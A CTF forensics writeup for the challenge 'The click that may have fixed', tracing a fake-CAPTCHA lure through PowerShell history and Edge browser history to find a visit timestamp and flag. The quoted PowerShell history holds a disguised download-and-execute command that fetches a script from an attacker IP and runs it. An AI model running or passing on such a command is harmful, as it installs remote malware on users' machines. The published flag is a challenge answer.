---
title: "The click that may have fixed - CTF@CIT 2026"
category: "forensics"
type: "writeup"
tags: ["forensics", "sqlite", "click", "may", "fixed", "ctf-cit", "ctf-cit-2026", "2026", "ctf-writeup"]
summary: "The attachment is a Windows user-profile backup, not a full disk image."
source:
  name: "CTFtime writeup #40736"
  url: "https://ctftime.org/writeup/40736"
ctf:
  name: "CTF@CIT 2026"
  year: 2026
  challenge: "The click that may have fixed"
---

## Metadata

- **CTF:** CTF@CIT 2026
- **Task:** The click that may have fixed
- **Author team:** Byte0xb105
- **CTFtime:** <https://ctftime.org/writeup/40736>

---
# The click that may have fixed — Writeup

\- Category: Forensics  
\- Value: 985  
\- Author: boom

## Challenge

> So one of the CTF@CIT 2026 players tried to download more RAM and it seems they may have gotten pwned. They said they got to one website, but the captcha required them to run some PowerShell..  
>  
> Can you identify what time that website was last visited?  
>  
> **FLAG FORMAT:** `CIT{YYYY-MM-DDThh:mm:ssZ}`  
>  
> **SHA1:** `aa50aa4516d0bc7b0aa23139f95d38edd916164a`

## Recon

The attachment is a Windows user-profile backup, not a full disk image.  
The useful artifacts are all user-space:

\- Edge history at `AppData/Local/Microsoft/Edge/User Data/Default/History`  
\- PowerShell command history at `AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt`

The PowerShell history shows the lure immediately:

```text  
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser  
$p='[unewhaven.com](http://unewhaven.com)'; Test-Connection $p -Count 6 | Out-Null; $j='http://23.179.17.92/az.ps1'; $c=Join-Path $env:APPDATA 'DiskCleaner.ps1'; Start-BitsTransfer -Source $j -Destination $c; & $c  
```

So the attacker-hosted infrastructure is already tied to `23.179.17.92`.

## Solve

I copied the Edge `History` SQLite database out of the zip and queried the `urls` and `visits` tables.

Relevant rows from `urls`:

```text  
10|https://23.179.17.92:5067/|Download More RAM!|2026-04-18 07:07:26|1  
9|<https://www.bing.com/search?q=free+ram+for+me>...|free ram for me - Search|2026-04-18 07:07:00|1  
6|<https://downloadmoreram.com/>|[DownloadMoreRAM.com](http://DownloadMoreRAM.com) \- CloudRAM 3.0 | AI-Powered Memory|2026-04-18 07:05:40|1  
```

Relevant row from `visits`:

```text  
11|https://23.179.17.92:5067/|Download More RAM!|2026-04-18 07:07:26|0|805306369  
```

That gives the last visit time for the fake CAPTCHA site directly in UTC:

```text  
2026-04-18T07:07:26Z  
```

Wrap it in the flag format.

## Flag

```text  
CIT{2026-04-18T07:07:26Z}  
```

## Files

\- [challenge.zip](files/challenge.zip)  
\- [[solve.py](http://solve.py)](scripts/[solve.py](http://solve.py))  
\- [history_urls.tsv](other/history_urls.tsv)  
\- [history_visits.tsv](other/history_visits.tsv)  
\- [consolehost_history.txt](other/consolehost_history.txt)
